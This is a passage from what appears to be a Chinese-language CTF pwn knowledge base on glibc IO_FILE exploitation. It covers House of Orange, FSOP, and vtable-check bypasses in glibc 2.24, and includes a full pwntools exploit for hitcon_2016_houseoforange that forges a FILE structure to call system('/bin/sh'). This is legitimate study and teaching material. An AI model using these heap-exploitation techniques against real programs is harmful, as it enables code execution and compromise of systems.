\u7533\u8bf7\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8e mmp_.mmap_threshold if (( unsigned long )( nb ) >= ( unsigned long )( mp_ . mmap_threshold ) && ( mp_ . n_mmaps < mp_ . n_mmaps_max )) \u603b\u7ed3\u4f2a\u9020 topchunk \u8981\u6c42\uff1a \u4f2a\u9020 size \u9700\u8981\u5bf9\u9f50\u5185\u5b58\u9875 \u6bd4\u5982\u73b0\u5728 topchunk size \u4e3a\uff1a 0x20fa1 \uff0c\u90a3\u4e48\u5bf9\u9f50\u5185\u5b58\u9875\u7684 size \u53ef\u4ee5\u4e3a\uff1a0xfa1\u30010x1fa1\u2026\u2026 size \u8981\u5927\u4e8e MINSIZE prev_inuse \u4e3a 1 size \u8981\u5c0f\u4e8e\u7b49\u7b49\u7533\u8bf7 chunk_size+MINISIZE \uff08\u624d\u80fd\u8ba9 topchunk \u653e\u5165 unsortedbin\uff09 \u81ea\u6b64\u5f97\u5230\u4e00\u4e2a unsortedbin \u5806\uff0c\u7528\u6765\u6cc4\u9732 libc \u5730\u5740\uff0c\u5b9e\u73b0 FSOP","title":"\u539f\u7406"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#hitcon_2016_houseoforange","text":"","title":"hitcon_2016_houseoforange"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_19","text":"\u4fdd\u62a4\u5168\u5f00\uff0c\u5b9e\u9a8c\u73af\u5883\u5728 Ubuntu16.04\u3002 \u80fd\u81ea\u4e3b\u63a7\u5236\u5206\u914d\u5806\u5927\u5c0f\uff0c\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a struct { * info ; chunk_ptr ; } struct info { price ; color ; } \u5728 edit \u51fd\u6570\u4e2d\u5b58\u5728\u5806\u6ea2\u51fa\uff1a","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_20","text":"\u5229\u7528\u5806\u6ea2\u51fa\u5c06 topchunk size \u6539\u5c0f\uff0csize \u8981\u6c42\u770b\u524d\u6587\u3002\u4fee\u6539\u524d topchunk \u548c heap \u8303\u56f4\uff1a \u4fee\u6539\u540e\u60c5\u51b5\uff1a \u4e4b\u540e\u7533\u8bf7\u4e00\u4e2a\u5927\u4e8e topchunk \u7684\u5806\uff0ctopchunk \u5c31\u88ab\u653e\u5165 unsortedbin \uff1a pwndbg> bin fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x5555557580a0 \u2014\u25b8 0x7ffff7dd1b78 ( main_arena+88 ) \u25c2\u2014 0x5555557580a0 \u7533\u8bf7\u4e00\u4e2a largebin \u7528\u4e8e\u6cc4\u9732 libc \u548c \u5806\u5730\u5740\u3002\u7528\u7684 malloc \u5206\u914d\uff0clibc \u8bfb\u53d6 bk \u4f4d\u7f6e\u4fe1\u606f\u5373\u53ef\uff0c\u5206\u914d\u7684\u662f largebin \u5728 fd_nextsize \u548c bk_nextsize \u90fd\u5b58\u653e\u5806\u5730\u5740\u5206\u522b\u8bfb\u51fa\u5373\u53ef\u3002\u5806\u5730\u5740\u5728 FSOP \u4f2a\u9020 vtable \u9700\u8981\u7528\u5230\u3002 \u81ea\u6b64\u540e\u9762\u5c31\u662f FSOP \u5229\u7528\u3002\u52ab\u6301\u5728 libc \u4e2d\u7684 _IO_list_all \u5185\u5bb9\uff0c\u5c06\u5176\u5185\u5bb9\u6307\u5411\u53ef\u63a7\u5730\u5740\u4f2a\u9020 _IO_FILE_plus \u548c vtabel \u3002\u9ed8\u8ba4\u72b6\u6001\u4e0b\u7684 _IO_list_all \u6307\u5411\u7684\u662f _IO_2_1_stderr_ \uff1a \u5229\u7528\u5806\u6ea2\u51fa\u4fee\u6539\u5728 unsortedbin \u7684 topchunk fd bk \u6307\u9488\uff0c\u53d1\u8d77 unsortedbin attack \u52ab\u6301 _IO_list_all \u3002\u8fd9\u91cc\u4fee\u6539\u5b8c fd bk \u4e4b\u540e\u7533\u8bf7\u4e00\u4e2a\u5806\uff0ctopchunk unlink \u5c31\u4f1a\u4fee\u6539 _IO_list_all \u6307\u5411\u5230 main_arena+88 \uff0c\u8fd9\u4e2a\u533a\u57df\u524d\u540e\u6211\u4eec\u8fd8\u662f\u4e0d\u80fd\u63a7\u5236\uff0c\u5c31\u5229\u7528 _chain \u6807\u5fd7\u4f4d\u6307\u5411\u4e0b\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u8fd9\u4e2a\u6807\u5fd7\u4f4d\u7684\u4f4d\u7f6e\u521a\u597d\u662f unsortedbin 0x60 \u94fe\u8868\u4f4d\u7f6e\u3002\u56e0\u6b64\u5c06 topchunk size \u8986\u76d6\u4e3a 0x60 \uff1a \u6267\u884c _IO_flush_all_lockp \u65f6\u9010\u4e2a\u904d\u5386\u6587\u4ef6\u6d41\uff0c\u9047\u5230\u9519\u8bef\u6587\u4ef6\u5c31\u8df3\u8fc7\u53bb\u5904\u7406 _chain \u6307\u5411\u7684\u4e0b\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u56e0\u6b64\u73b0\u5728 topchunk \u91cc\u9762\u4f2a\u9020\u4e00\u4e2a _IO_FILE_plus \u7ed3\u6784\u4f53\u3002 \u9700\u8981\u8bbe\u7f6e\u51e0\u4e2a\u6807\u5fd7\u4f4d\u7ed5\u8fc7\u4fdd\u62a4\uff1a mode_offset = 0x0 ; writeptr_offset = 0x1 ; writebase_offset = 0x0 ; \u7136\u540e\u5c06 vtable \u6307\u9488\u52ab\u6301\u4f1a topchunk \u7279\u5b9a\u4f4d\u7f6e\uff0c\u8ba9 __overflow \u4e3a system \uff0c\u6587\u4ef6\u6d41\uff08topchunk\uff09\u5934\u90e8\u8986\u76d6\u4e3a /bin/sh \u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u3002 \u6210\u529f\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a","title":"\u601d\u8def"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#exp_1","text":"from pwn import * context ( log_level = 'debug' , arch = 'amd64' ) # p = process(\"./houseoforange_hitcon_2016\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") p = remote ( \"node3.buuoj.cn\" , 29595 ) libc = ELF ( \"./libc-2.23.so\" ) elf = ELF ( \"./houseoforange_hitcon_2016\" ) def command ( id ): p . recvuntil ( \": \" ) p . sendline ( str ( id )) def add ( size , content , price , color ): command ( 1 ) p . recvuntil ( \"Length of name :\" ) p . sendline ( str ( size )) p . recvuntil ( \"Name :\" ) p . send ( content ) p . recvuntil ( \"Price of Orange:\" ) p . sendline ( str ( price )) p . recvuntil ( \"Color of Orange:\" ) p . sendline ( str ( color )) def show (): command ( 2 ) def edit ( size , content , price , color ): command ( 3 ) p . recvuntil ( \"Length of name :\" ) p . sendline ( str ( size )) p . recvuntil ( \"Name:\" ) p . send ( content ) p . recvuntil ( \"Price of Orange:\" ) p . sendline ( str ( price )) p . recvuntil ( \"Color of Orange:\" ) p . sendline ( str ( color )) # step1 'free' 2 bin add ( 0x18 , 'a' * 8 , 0xddaa , 0xddaa ) payload = 'a' * 0x38 + p64 ( 0xfa1 ) edit ( len ( payload ), payload , 0xddaa , 0xddaa ) add ( 0x1000 , 'b' * 8 , 0xddaa , 0xddaa ) #0x555555758000 0x555555779000 rw-p 21000 0 [heap] #0x555555758000 0x55555579b000 rw-p 43000 0 [heap] # step2 leak libc add ( 0x450 , 'c' * 8 , 0xddaa , 0xddaa ) show () p . recvuntil ( 'c' * 8 ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_addr = leak_addr - 1640 - 0x3c4b20 log . info ( \"libc_addr:\" + hex ( libc_addr )) IO_list_all = libc_addr + libc . sym [ '_IO_list_all' ] log . info ( \"IO_list_all:\" + hex ( IO_list_all )) system = libc_addr + libc . sym [ 'system' ] # step3 leak heap payload = 'd' * 0x10 edit ( 0x10 , payload , 0xddaa , 0xddaa ) show () p . recvuntil ( 'd' * 0x10 ) heap_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"heap_addr:\" + hex ( heap_addr )) # set fake struct payload = 'd' * 0x450 + p64 ( 0 ) + p64 ( 0x21 ) + p64 ( 0x0000ddaa00000003 ) + p64 ( 0 ) fake = '/bin/sh \\x00 ' + p64 ( 0x61 ) fake += p64 ( 0 ) + p64 ( IO_list_all - 0x10 ) fake += p64 ( 0 ) + p64 ( 1 ) fake = fake . ljust ( 0xc0 , ' \\x00 ' ) fake += p64 ( 0 ) * 3 fake += p64 ( heap_addr + 0x558 ) #vtable fake += p64 ( 0 ) * 2 fake += p64 ( system ) payload += fake edit ( len ( payload ), payload , 2 , 3 ) #gdb.attach(p) # unlink attack p . recvuntil ( \"Your choice : \" ) p . sendline ( '1' ) p . interactive ()","title":"EXP"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_21","text":"ctf-HITCON-2016-houseoforange\u5b66\u4e60 houseoforange_hitcon_2016\uff08House of orange\uff0c unsorted bin attack\uff0cFSOP\uff09 house_of_orange","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/IO_FILE/Pwn_IO_FILE/#_22","text":"IO_FILE:2018 HCTF the_end 4.13 \u5229\u7528 _IO_FILE \u7ed3\u6784 IO_FILE Related IO file\u7ed3\u6784\u5728pwn\u4e2d\u7684\u5999\u7528 IO_FILE Pwn \u5229\u7528\u6574\u7406 \u7528 fwrite \u7b49\u8fd9\u79cd\u6d41 I/O \u51fd\u6570\u5199\u5165\u5199\u51fa\uff0c\u6570\u636e\u4f1a\u5148\u653e\u5728\u7f13\u51b2\u533a\uff0c\u5e76\u6ca1\u6709\u771f\u6b63\u8f93\u5165\u6216\u8005\u8f93\u51fa\uff0c\u9700\u8981\u7528 fflush \u51b2\u6d17\u6d41\u4e2d\u4fe1\u606f\u624d\u5b8c\u6210\u5199\u5165\u5199\u51fa\u3002\u907f\u514d\u7528 fflush \u51b2\u6d17\u5c31\u7528 setbuf \u51fd\u6570\u5173\u95ed\u7f13\u51b2\uff08pwn \u9898\u521d\u59cb\u5316\u5fc5\u5907\uff09 \u21a9","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/","text":"glibc 2.24 \u4e0b IO_FILE \u7684\u5229\u7528 \u00b6 \u4ecb\u7ecd \u00b6 \u5728 2.24 \u7248\u672c\u7684 glibc \u4e2d\uff0c\u5168\u65b0\u52a0\u5165\u4e86\u9488\u5bf9 IO_FILE_plus \u7684 vtable \u52ab\u6301\u7684\u68c0\u6d4b\u63aa\u65bd\uff0cglibc \u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5 vtable \u5730\u5740\u7684\u5408\u6cd5\u6027\u3002\u9996\u5148\u4f1a\u9a8c\u8bc1 vtable \u662f\u5426\u4f4d\u4e8e_IO_vtable \u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528_IO_vtable_check \u505a\u8fdb\u4e00\u6b65\u68c0\u67e5\u3002 /* Check if unknown vtable pointers are permitted; otherwise, terminate the process. */ void _IO_vtable_check ( void ) attribute_hidden ; /* Perform vtable pointer validation. If validation fails, terminate the process. */ static inline const struct _IO_jump_t * IO_validate_vtable ( const struct _IO_jump_t * vtable ) { /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables ; uintptr_t ptr = ( uintptr_t ) vtable ; uintptr_t offset = ptr - ( uintptr_t ) __start___libc_IO_vtables ; if ( __glibc_unlikely ( offset >= section_length )) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable ; } \u8ba1\u7b97 section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; \uff0c\u7d27\u63a5\u7740\u4f1a\u5224\u65ad vtable - __start___libc_IO_vtables \u7684 offset \uff0c\u5982\u679c\u8fd9\u4e2a offset \u5927\u4e8e section_length , \u5373\u5927\u4e8e __stop___libc_IO_vtables - __start___libc_IO_vtables \u90a3\u4e48\u5c31\u4f1a\u8c03\u7528 _IO_vtable_check() \u8fd9\u4e2a\u51fd\u6570\u3002 void attribute_hidden _IO_vtable_check ( void ) { #ifdef SHARED /* Honor the compatibility flag. */ void ( * flag ) ( void ) = atomic_load_relaxed ( & IO_accept_foreign_vtables ); #ifdef PTR_DEMANGLE PTR_DEMANGLE ( flag ); #endif if ( flag == & _IO_vtable_check ) return ; /* In case this libc copy is in a non-default namespace, we always need to accept foreign vtables because there is always a possibility that FILE * objects are passed across the linking boundary. */ { Dl_info di ; struct link_map * l ; if ( _dl_open_hook != NULL || ( _dl_addr ( _IO_vtable_check , & di , & l , NULL ) != 0 && l -> l_ns != LM_ID_BASE )) return ; } #else /* !SHARED */ /* We cannot perform vtable validation in the static dlopen case because FILE * handles might be passed back and forth across the boundary. Therefore, we disable checking in this case. */ if ( __dlopen != NULL ) return ; #endif __libc_fatal ( \"Fatal error: glibc detected an invalid stdio handle \\n \" ); } \u5982\u679c vtable \u662f\u975e\u6cd5\u7684\uff0c\u90a3\u4e48\u4f1a\u5f15\u53d1 abort\u3002 \u8fd9\u91cc\u7684\u68c0\u67e5\u4f7f\u5f97\u4ee5\u5f80\u4f7f\u7528 vtable \u8fdb\u884c\u5229\u7528\u7684\u6280\u672f\u5f88\u96be\u5b9e\u73b0 \u65b0\u7684\u5229\u7528\u6280\u672f \u00b6 fileno \u4e0e\u7f13\u51b2\u533a\u7684\u76f8\u5173\u5229\u7528 \u00b6 \u52ab\u6301 _IO_FILE \u7ed3\u6784\u4f53\u7684 _IO_buf_base \u548c _IO_buf_end \u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199 \u5728 vtable \u96be\u4ee5\u88ab\u5229\u7528\u4e4b\u540e\uff0c\u5229\u7528\u7684\u5173\u6ce8\u70b9\u4ece vtable \u8f6c\u79fb\u5230_IO_FILE \u7ed3\u6784\u5185\u90e8\u7684\u57df\u4e2d\u3002 \u524d\u9762\u4ecb\u7ecd\u8fc7_IO_FILE \u5728\u4f7f\u7528\u6807\u51c6 IO \u5e93\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\u5e76\u8d1f\u8d23\u7ef4\u62a4\u4e00\u4e9b\u76f8\u5173\u4fe1\u606f\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u57df\u662f\u8868\u793a\u8c03\u7528\u8bf8\u5982 fwrite\u3001fread \u7b49\u51fd\u6570\u65f6\u5199\u5165\u5730\u5740\u6216\u8bfb\u53d6\u5730\u5740\u7684\uff0c\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e9b\u6570\u636e\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6216\u4efb\u610f\u5730\u5740\u8bfb\u3002 struct _IO_FILE { int _flags ; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char * _IO_read_ptr ; /* Current read pointer */ char * _IO_read_end ; /* End of get area. */ char * _IO_read_base ; /* Start of putback+get area. */ char * _IO_write_base ; /* Start of put area. */ char * _IO_write_ptr ; /* Current put pointer. */ char * _IO_write_end ; /* End of put area. */ char * _IO_buf_base ; /* Start of reserve area. */ char * _IO_buf_end ; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char * _IO_save_base ; /* Pointer to start of non-current get area. */ char * _IO_backup_base ; /* Pointer to first valid character of backup area */ char * _IO_save_end ; /* Pointer to end of non-current get area. */ struct _IO_marker * _markers ; struct _IO_FILE * _chain ; int _fileno ; int _flags2 ; _IO_off_t _old_offset ; /* This used to be _offset but it's too small. */ }; \u56e0\u4e3a\u8fdb\u7a0b\u4e2d\u5305\u542b\u4e86\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41 stdin\\stdout\\stderr\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0d\u9700\u8981\u8fdb\u7a0b\u4e2d\u5b58\u5728\u6587\u4ef6\u64cd\u4f5c\uff0c\u901a\u8fc7 scanf\\printf \u4e00\u6837\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002 \u5728_IO_FILE \u4e2d_IO_buf_base \u8868\u793a\u64cd\u4f5c\u7684\u8d77\u59cb\u5730\u5740\uff0c_IO_buf_end \u8868\u793a\u7ed3\u675f\u5730\u5740\uff0c\u901a\u8fc7\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u636e\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236\u8bfb\u5199\u7684\u64cd\u4f5c\u3002 \u793a\u4f8b \u00b6 \u7b80\u5355\u7684\u89c2\u5bdf\u4e00\u4e0b_IO_FILE \u5bf9\u4e8e\u8c03\u7528 scanf \u7684\u4f5c\u7528 #include \"stdio.h\" char buf [ 100 ]; int main () { char stack_buf [ 100 ]; scanf ( \"%s\" , stack_buf ); scanf ( \"%s\" , stack_buf ); } \u5728\u6267\u884c\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u4f7f\u7528 stdin \u4e4b\u524d\uff0cstdin \u7684\u5185\u5bb9\u8fd8\u672a\u521d\u59cb\u5316\u662f\u7a7a\u7684 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2088 0x0000000000000000 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 <== vtable \u8c03\u7528 scanf \u4e4b\u540e\u53ef\u4ee5\u770b\u5230_IO_read_ptr\u3001_IO_read_base\u3001_IO_read_end\u3001_IO_buf_base\u3001_IO_buf_end \u7b49\u57df\u90fd\u88ab\u521d\u59cb\u5316 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000602410 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 \u8fdb\u4e00\u6b65\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\u5176\u5b9e stdin \u521d\u59cb\u5316\u7684\u5185\u5b58\u662f\u5728\u5806\u4e0a\u5206\u914d\u51fa\u6765\u7684\uff0c\u5728\u8fd9\u91cc\u5806\u7684\u57fa\u5740\u662f 0x602000\uff0c\u56e0\u4e3a\u4e4b\u524d\u6ca1\u6709\u5806\u5206\u914d\u56e0\u6b64\u7f13\u51b2\u533a\u7684\u5730\u5740\u4e5f\u662f 0x602010 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/1/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/1/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/1/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] \u5206\u914d\u7684\u5806\u5927\u5c0f\u662f 0x400 \u4e2a\u5b57\u8282\uff0c\u6b63\u597d\u5bf9\u5e94\u4e8e_IO_buf_base\uff5e_IO_buf_end \u5728\u8fdb\u884c\u5199\u5165\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u7f13\u51b2\u533a\u4e2d\u6709\u6211\u4eec\u5199\u5165\u7684\u6570\u636e\uff0c\u4e4b\u540e\u76ee\u7684\u5730\u5740\u6808\u4e2d\u7684\u7f13\u51b2\u533a\u4e5f\u4f1a\u5199\u5165\u6570\u636e 0x602000: 0x0000000000000000 0x0000000000000411 <== \u5206\u914d0x400\u5927\u5c0f 0x602010: 0x000000000a333231 0x0000000000000000 <== \u7f13\u51b2\u6570\u636e 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 \u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539_IO_buf_base \u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u5168\u5c40\u7f13\u51b2\u533a buf \u7684\u5730\u5740\u662f 0x7ffff7dd2740\u3002\u4fee\u6539_IO_buf_base \u548c_IO_buf_end \u5230\u7f13\u51b2\u533a buf \u7684\u5730\u5740 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x00007ffff7dd2740 <== _IO_buf_base 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x00007ffff7dd27c0 0x0000000000000000 <== _IO_buf_end 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 \u4e4b\u540e scanf \u7684\u8bfb\u5165\u6570\u636e\u5c31\u4f1a\u5199\u5165\u5230 0x7ffff7dd2740 \u7684\u4f4d\u7f6e 0x7ffff7dd2740 <buf>: 0x00000a6161616161 0x0000000000000000 0x7ffff7dd2750 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2760 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2770 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2780 <buffer>: 0x0000000000000000 0x0000000000000000 _IO_str_jumps -> overflow \u00b6 \u52a0\u5165\u7684\u662f check \u662f\u9488\u5bf9 _IO_FILE_plus \u7684 vtable \u68c0\u67e5\uff0c\u6ca1\u6709\u5bf9 _IO_str_jumps vtable \u8fdb\u884c\u68c0\u67e5\u3002\u52ab\u6301\u8fd9\u4e2a\u540e\u8005\u7684 vtable \uff0c\u627e\u8c03\u7528\u8fd9\u4e2a\u865a\u51fd\u6570\u7684\u51fd\u6570\u8fd0\u884c getshell libc \u4e2d\u4e0d\u4ec5\u4ec5\u53ea\u6709 _IO_file_jumps \u8fd9\u4e48\u4e00\u4e2a vtable \uff0c\u8fd8\u6709\u4e00\u4e2a\u53eb _IO_str_jumps \u7684 \uff0c\u8fd9\u4e2a vtable \u4e0d\u5728 check \u8303\u56f4\u4e4b\u5185\u3002 const struct _IO_jump_t _IO_str_jumps libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_str_finish), JUMP_INIT(overflow, _IO_str_overflow), JUMP_INIT(underflow, _IO_str_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_str_pbackfail), JUMP_INIT(xsputn, _IO_default_xsputn), JUMP_INIT(xsgetn, _IO_default_xsgetn), JUMP_INIT(seekoff, _IO_str_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_default_setbuf), JUMP_INIT(sync, _IO_default_sync), JUMP_INIT(doallocate, _IO_default_doallocate), JUMP_INIT(read, _IO_default_read), JUMP_INIT(write, _IO_default_write), JUMP_INIT(seek, _IO_default_seek), JUMP_INIT(close, _IO_default_close), JUMP_INIT(stat, _IO_default_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; \u5982\u679c\u6211\u4eec\u80fd\u8bbe\u7f6e\u6587\u4ef6\u6307\u9488\u7684 vtable \u4e3a _IO_str_jumps \u4e48\u5c31\u80fd\u8c03\u7528\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u3002\u8fd9\u91cc\u4ee5 _IO_str_overflow \u4e3a\u4f8b\u5b50\uff1a int _IO_str_overflow ( _IO_FILE * fp , int c ) { int flush_only = c == EOF ; _IO_size_t pos ; if ( fp -> _flags & _IO_NO_WRITES ) // pass return flush_only ? 0 : EOF ; if (( fp -> _flags & _IO_TIED_PUT_GET ) && ! ( fp -> _flags & _IO_CURRENTLY_PUTTING )) { fp -> _flags |= _IO_CURRENTLY_PUTTING ; fp -> _IO_write_ptr = fp -> _IO_read_ptr ; fp -> _IO_read_ptr = fp -> _IO_read_end ; } pos = fp -> _IO_write_ptr - fp -> _IO_write_base ; if ( pos >= ( _IO_size_t ) ( _IO_blen ( fp ) + flush_only )) // should in { if ( fp -> _flags & _IO_USER_BUF ) /* not allowed to enlarge */ // pass return EOF ; else { char * new_buf ; char * old_buf = fp -> _IO_buf_base ; size_t old_blen = _IO_blen ( fp ); _IO_size_t new_size = 2 * old_blen + 100 ; if ( new_size < old_blen ) //pass \u4e00\u822c\u4f1a\u901a\u8fc7 return EOF ; new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); //target [fp+0xe0] if ( new_buf == NULL ) { /* __ferror(fp) = 1; */ return EOF ; } if ( old_buf ) { memcpy ( new_buf , old_buf , old_blen ); ( * (( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( old_buf ); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp -> _IO_buf_base = NULL ; } memset ( new_buf + old_blen , '\\0' , new_size - old_blen ); _IO_setb ( fp , new_buf , new_buf + new_size , 1 ); fp -> _IO_read_base = new_buf + ( fp -> _IO_read_base - old_buf ); fp -> _IO_read_ptr = new_buf + ( fp -> _IO_read_ptr - old_buf ); fp -> _IO_read_end = new_buf + ( fp -> _IO_read_end - old_buf ); fp -> _IO_write_ptr = new_buf + ( fp -> _IO_write_ptr - old_buf ); fp -> _IO_write_base = new_buf ; fp -> _IO_write_end = fp -> _IO_buf_end ; } } if ( ! flush_only ) * fp -> _IO_write_ptr ++ = ( unsigned char ) c ; if ( fp -> _IO_write_ptr > fp -> _IO_read_end ) fp -> _IO_read_end = fp -> _IO_write_ptr ; return c ; } libc_hidden_def ( _IO_str_overflow ) \u5229\u7528\u4ee5\u4e0b\u4ee3\u7801\u6765\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); \u51e0\u4e2a\u6761\u4ef6 bypass\uff1a 1. fp->_flags & 